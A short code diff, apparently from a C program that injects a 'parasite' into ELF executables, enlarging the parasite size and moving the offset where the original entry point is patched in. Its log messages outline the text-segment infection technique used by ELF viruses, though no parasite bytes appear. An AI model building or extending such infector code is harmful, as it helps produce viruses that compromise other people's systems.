@@ -1,5 +1,5 @@
 #define PAGE_SIZE 4096
-#define PARASITE_SIZE 41
+#define PARASITE_SIZE 51
 
 
 #include <elf.h>
@@ -95,7 +95,7 @@ int main(int argc, char * argv[]){
   puts("[Info][02] Patching parasite to jump to the original entry point...");
 	parasite = get_parasite();
   printf("[Info] writing entry point %x to parasite.\n",elf_header->e_entry);
-	memcpy(&parasite[32],&elf_header->e_entry, 4);	
+	memcpy(&parasite[42],&elf_header->e_entry, 4);	
 	
 	//Locate the text segment program header	
   puts("[Info][03] Locating the text segment program header...");
